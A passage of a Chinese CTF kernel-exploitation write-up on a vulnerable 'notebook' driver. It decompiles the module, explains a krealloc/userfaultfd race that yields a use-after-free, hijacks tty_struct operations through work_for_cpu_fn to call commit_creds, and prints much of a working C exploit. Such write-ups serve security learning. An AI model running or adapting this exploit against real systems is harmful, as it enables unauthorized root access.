*pos)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// r13</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(file);<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Write idx out of range.\n&quot;</span>, buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = v4;<br>    size = notebook[v5].size;<br>    note = notebook[v5].note;<br>    _check_object_size(note, size, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( copy_from_user(note, buf, size) )<br>      printk(<span class="hljs-string">&quot;[x] copy from user error.\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      printk(<span class="hljs-string">&quot;[*] Write success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="noteedit-read-lock"><a href="#noteedit-read-lock" class="headerlink" title="noteedit(read_lock)"></a>noteedit(read_lock)</h4><p>有读锁，我们的新name是我们的userarg.buf,然后我们会调用krealloc来重新分配堆块，这里会判断size是否为0，所以我们也无法通过传递size为0来使用UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">noteedit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> newsize, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rdx</span><br>  __int64 v4; <span class="hljs-comment">// r13</span><br>  note *v5; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// rax</span><br>  __int64 v7; <span class="hljs-comment">// r12</span><br>  __int64 v8; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(idx);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0xF</span> )<br>  &#123;<br>    v8 = <span class="hljs-number">-1LL</span>;<br>    printk(<span class="hljs-string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);<br>    <span class="hljs-keyword">return</span> v8;<br>  &#125;<br>  v4 = v3;<br>  v5 = &amp;notebook[idx];<br>  raw_read_lock(&amp;lock);<br>  size = v5-&gt;size;<br>  v5-&gt;size = newsize;<br>  <span class="hljs-keyword">if</span> ( size == newsize )<br>  &#123;<br>    v8 = <span class="hljs-number">1LL</span>;<br>    <span class="hljs-keyword">goto</span> editout;<br>  &#125;<br>  v7 = (*krealloc.gap0)(v5-&gt;note, newsize, <span class="hljs-number">37748928LL</span>); <span class="hljs-comment">//用于重新为让p执行一段新申请的内存，但是保持p指针指向内存中的内容不变，通俗讲就是为p重新申请一段内存，再将p之前内存中的内容复制过来.如果说此时newsize为0,则会释放该堆块，且不做任何操作</span><br>  copy_from_user(name, v4, <span class="hljs-number">256LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v5-&gt;size ) 			<span class="hljs-comment">//传0是不阔以哒</span><br>  &#123;<br>    printk(<span class="hljs-string">&quot;free in fact&quot;</span>);<br>    v5-&gt;note = <span class="hljs-number">0LL</span>;<br>    v8 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">goto</span> editout;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( _virt_addr_valid(v7) )<br>  &#123;<br>    v5-&gt;note = v7;<br>    v8 = <span class="hljs-number">2LL</span>;<br>editout:<br>    raw_read_unlock(&amp;lock);<br>    printk(<span class="hljs-string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);<br>    <span class="hljs-keyword">return</span> v8;<br>  &#125;<br>  printk(<span class="hljs-string">&quot;[x] Return ptr unvalid.\n&quot;</span>);<br>  raw_read_unlock(&amp;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">3LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="3-利用思路"><a href="#3-利用思路" class="headerlink" title="3. 利用思路"></a>3. 利用思路</h3><p>Krealloc , pwn:v:肯定有点熟悉这个realloc，在这里也是类似的，他的功能就是重新分配堆块，如果传入size为0，则会释放掉他。</p>
<p>我们之前经过分析，这个notedel好像可以使得size为0，然后UAF，事实上也确实如此。</p>
<p>接下来我们试想这样一个场景：</p>
<ol>
<li>存在线程1，线程2，并且其都会通过<code>copy from user</code> or <code>copy to user</code> for accessing the userland.</li>
<li>也就是说可以满足我们访问用户区域的条件，此时虽然存在多线程问题，但是触发条件十分艰巨，也就是说我们想要触发我们希望的修改条件，让他们自己跑的话是十分复杂且困难的，就拿两个线程来说，我们需要满足线程1在执行完语句n之后，需要线程2立刻执行自己区域的语句z，然后再回到线程1执行n+1.我们可以料想到这是有多么复杂</li>
<li>一切都要归于时间片，他实在是太短且不太好预测，所以线程切换的时间也不是我们可以任意控制的，因此我们可以想到，如果让线程1再执行到需要语句的时候即使阻塞呢，然后再调用了线程2，这样就可以达成我们需要的调用链</li>
<li>因此这里我们采用<code>userfaultfd</code>来达成该效果，调用监听线程来使得某线程阻塞，无限拉大线程切换的过程，使我们有足够的时间来做小动作</li>
</ol>
<h3 id="4-漏洞利用-1"><a href="#4-漏洞利用-1" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>:one:  使用mmap构造匿名映射区域，将其传入内核，并且将该区域使用userfaultfd来进行监控，到适当时间我们就将他阻塞</p>
<p>:two:  在noteedit的时候，我们如果传入size为0，他会调用krealloc来将我们原本的note-&gt;note块释放，然后他会调用<code>copy_from_user</code>函数，会访问我们用户传入的指针，然后监控线程检测到缺页访问，因此挂起该线程执行操作，但此时我们的note-&gt;note是仍然为释放后的堆地址的，且size位为0，因此就达成了一个UAF的条件 ，但是这里我们仍需要将size位置为非零值，因为我们总是要结束线程的，即使他理论上可以延长无限值。如果结束userfaultfd的时候size仍然为0，则按照ida反编译的情况来查看，他会覆盖掉我们的UAF地址，这样就会出现一个非预期错误。</p>
<img src="/2023/06/24/Linux-Kernel-0x02-Practice/krealloc.png" srcset="/img/loading.gif" lazyload class="">

<p>然后size的修改我们采用noteadd函数当中的值，我们发现他是先修改掉size，然后会有个与用户交换数据的过程，此时我们再触发一次<code>userfaultfd</code>就可以了</p>
<img src="/2023/06/24/Linux-Kernel-0x02-Practice/noteadd.png" srcset="/img/loading.gif" lazyload class="">

<p>:three:  此时如果我们在之前的note的大小为我们特殊构造的话，例如0x2e0，此时我们可以利用<code>tty_struct</code>来泄露内核的基地址，所以我们此时选则打开ptmx设备，而我们的tty_struct本身是可以泄露内核基地址的，在初始化tty_struct的时候，其中的<code>tty_opreations</code>会初始化为<code>ptm_unix98_ops</code>或<code>pty_unix98_ops</code>这两个全局变量，是谁是随机的，所以我们需要有一个判断，这里有一个坑点是我们从<code>objdump -d vmlinux &gt; symtable</code>中的symtable是找不出这两个全局变量的，我们可以把vmlinunx拖入ida中来查找</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/f9198618367adab40971a88cced4b31c8601e458.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里有个难以理解的点就是，我们的tty_struct可能存在分配失败的情况，如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc0393dc5077913f8794a5c2265c.jpg" srcset="/img/loading.gif" lazyload></p>
<p>:four: 当我们构造了UAF的<code>tty_struct</code>后,我们就可以将我们的<code>fake_operations</code>布置在我们的notebook数组当中，这样我们可以任意修改其中的函数指针，就可以尽情的利用它了！</p>
<p>:five: 但是本题基本上能开的保护差不多都开了，所以我们的链条有点难构造，这里有一个小tips，介绍一种在多核内核下基本存在的一个函数<code>work_for_cpu_fn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  _fentry__();<br>  result = (*(a1 + <span class="hljs-number">0x20</span>))(*(a1 + <span class="hljs-number">0x28</span>));<br>  *(a1 + <span class="hljs-number">0x30</span>) = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以发现该函数的一个功能就是调用*(rdi+0x20)(rdi + 0x28)这个函数，然后我们的返回值存放在(rdi+0x30)当中，而我们的<code>file_operations</code>上的函数第一个参数一般都是<code>tty__struct</code>,所以说我们就可以分次来调用<code>preapare_kernel_cred(NULL)</code>和<code>commit_creds()</code>来进行提权，然后我们只需要<strong>正常的返回用户态即可</strong>，并不需要进行ROP里面的各类绕过，不用找那么多gadget了，很舒服。</p>
<p>:six: 最后我们需要恢复之前的tty_struct就正常返回调用<code>system</code>就可以了</p>
<h3 id="5-结果-amp-Exploit"><a href="#5-结果-amp-Exploit" class="headerlink" title="5.结果&amp;Exploit"></a>5.结果&amp;Exploit</h3><p><img src="http://imgsrc.baidu.com/forum/pic/item/8435e5dde71190efcaf52e108b1b9d16fcfa60f7.jpg" srcset="/img/loading.gif" lazyload></p>
<p>如图，可达成稳定提权，下面就是本次的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg) do&#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                    &#125; while(0)</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> note_fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> tty_fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* page = <span class="hljs-string">&quot;abcd&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">size_t</span> PTM_UNIX98_OPS = <span class="hljs-number">0xFFFFFFFF81E8E440</span>;<br><span class="hljs-type">size_t</span> PTY_UNIX98_OPS = <span class="hljs-number">0xFFFFFFFF81E8E320</span>;<br><span class="hljs-type">size_t</span> WORK_FOR_CPU_FN = <span class="hljs-number">0xffffffff8109eb90</span>;<br><span class="hljs-type">size_t</span> PREPARE_KERNEL_CRED = <span class="hljs-number">0xffffffff810a9ef0</span>;<br><span class="hljs-type">size_t</span> COMMIT_CREDS = <span class="hljs-number">0xffffffff810a9b40</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span>&#123;</span><br>  <span class="hljs-type">size_t</span> idx;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-type">void</span>* buf;<br>&#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">addnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">editnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">deletenote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  info_log(<span class="hljs-string">&quot;States has been saved successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    info_log(<span class="hljs-string">&quot;CPU bind succesfully&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>&#123;<br>  PRINT_ADDR(<span class="hljs-string">&quot;starting to monitor&quot;</span>, addr);<br>  <span class="hljs-type">long</span> uffd;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>  <span class="hljs-type">pthread_t</span> monitor_thread;<br>  <span class="hljs-type">int</span> s;<br><br>  <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>  <span class="hljs-keyword">if</span>(uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>  uffdio_api.api = UFFD_API;<br>  uffdio_api.features = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>  uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>  uffdio_register.range.len = len;<br>  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>  <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>  s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd);<br>  <br>  info_log(<span class="hljs-string">&quot;create thread...&quot;</span>);<br>  <span class="hljs-keyword">if</span>(s != <span class="hljs-number">0</span>)&#123;<br>    errno = s;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span> <span class="hljs-comment">/* data read from userfaultfd */</span><br>  <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>  <span class="hljs-type">long</span> uffd;        <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>  <span class="hljs-type">ssize_t</span> nread;<br><br>  uffd = (<span class="hljs-type">long</span>)arg;<br><br>  <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd file descriptor */</span><br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span>(nready == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>    <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br>    info_log(<span class="hljs-string">&quot;catch the user page fault!&quot;</span>);<br>    nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>    sleep(<span class="hljs-number">10000</span>);<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>    